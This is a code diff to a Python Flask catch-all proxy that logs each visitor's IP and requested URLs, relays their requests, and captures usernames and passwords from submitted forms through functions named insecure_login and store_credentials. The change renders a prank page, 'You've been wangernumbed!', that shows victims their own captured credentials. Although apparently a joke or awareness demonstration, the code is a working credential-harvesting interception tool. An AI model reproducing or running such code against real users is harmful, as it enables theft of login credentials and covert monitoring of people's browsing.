@@ -78,23 +78,34 @@ def get_url(path):
     return path
   return "http://%s/%s" % (host, path)
 
+def simple_rr(url, ip, u=None, p=None):
+  obj = {
+    "title": "You've been wangernumbed!",
+    "url": url,
+    "ip": ip,
+    "username": u,
+    "password": p
+  };
+  return render_template('rr.jade', **obj)
+
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>', methods=['GET', 'POST'])
 def catch_all(path):
   # log the request
   url = get_url(path)
-  add_visited(request.remote_addr, url)
+  ip = request.remote_addr
+  add_visited(ip, url)
   # print 'You want path: %s' % url
   # print request.method
   if url.startswith("http://www.nytimes.com"):
-    return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+    return simple_rr(url, ip)
   if request.method == "POST":
     (u, p) = insecure_login(request.form)
     print "POST REQUEST: "
     print request.form
     if (u, p):
-      store_credentials(request.remote_addr, url, u, p)
-      return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+      store_credentials(ip, url, u, p)
+      return simple_rr(url, ip, u, p)
     r = requests.post(url, data=dict(request.form))
   else:
     r = requests.get(url)
